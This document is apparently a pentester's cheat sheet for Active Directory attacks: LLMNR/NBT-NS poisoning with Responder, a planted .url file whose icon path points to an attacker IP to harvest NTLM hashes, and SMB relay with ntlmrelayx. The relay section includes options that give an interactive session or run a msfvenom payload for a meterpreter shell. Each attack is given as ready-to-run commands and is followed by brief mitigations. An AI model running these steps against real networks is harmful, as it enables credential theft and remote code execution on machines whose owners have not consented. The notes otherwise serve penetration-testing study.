## LLMNR/NBT-NS poisoning
```
This attack happens when any user or computer request a resource or ip which the network dns fails to resolve(Meaning they either mistyped or requesting non existing resource). LLMNR is a Windows AD feature which tries to resolve request when DNS fails.  We as an attacker can respond to the user using a tool called responder and act as a LLMNR server. LLMNR key flaw is that it requires user hash to work. We request users hash from the user and say we will resolve their request and this way we perform a mitm attack inside a AD network

NOte: This attack assumes we have network access same as the target

    Run responder
    responder -I interface(eth0,tun0 etc) -rdw

    Assume a user on the network tries to connect to a wrong smb share ,we will act as a llmnr server because dns fails and get the hash

    \shre
    we get the hash and now can crack it ,pass the hash etc

Defense against LLMNR poisoning:

    Disable LLMNR and NBT-NS
    If LLMNR is required by the company ,then enforce NAC or network access control which means that only the devices with authorized MAC addresses can connect to the internal network.
    Set comnplex Password policy so captured hash cannot be cracked easily



Url File Attacks (requires access to a domain machine and a writabele share)
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share. We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine

    create a file with following text and name it like "@anyname.url"

[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1

    Now we run responder and wait for the file to be opened
    responder -I eth0 -rdw



SMB Relay attack
In this attack we utilize llmnr poisoning and then use the captured hashes to dump sensitive critical information on other machines in the network.We utilize responder and ntlmrelay tool. Requirement for this is that smb signing must be disabled on target and the hash of the user which we captured,must be admin on the target machine.

    We need to narrow down all the targets which have smb signing disabled or enabled but are not required for logging in.

    nmap --script=smb2-security-mode.nse -p445

    Edit the /etc/responder/Responder.conf file to disable smb and http flags to off

    run responder

    responder -I interface -rdw

    now run ntlmrelay

    ntlmrelayx.py -tf targetlist.txt -smb2support

    Now any user must cause the llmnr attack and our smb relay attack will work

    We will receive SAM hashes and hives etc.

                OR

when running ntlm relay we can specify -i flag to get a interactive session.Then we nc into that specific local port and get bunch of feauturs.

    ntlmrelayx.py -tf targetlist.txt -smb2support -i

We can also specify -e to execute an executable when succesful.We can create a msfvenom exe payload and and specify that and get a meterpreter shell or any common shell

    ntlmrelayx.py -tf targetlist.txt -smb2support -e shell.exe

Mitigation:

    enable smb signing on every device across the network
    Disable ntlm authentication on the network(kerberos more secure)
    Limit local administrators across the network(a admin of single workstation is also admin of many other workstations which allows this attack)
```
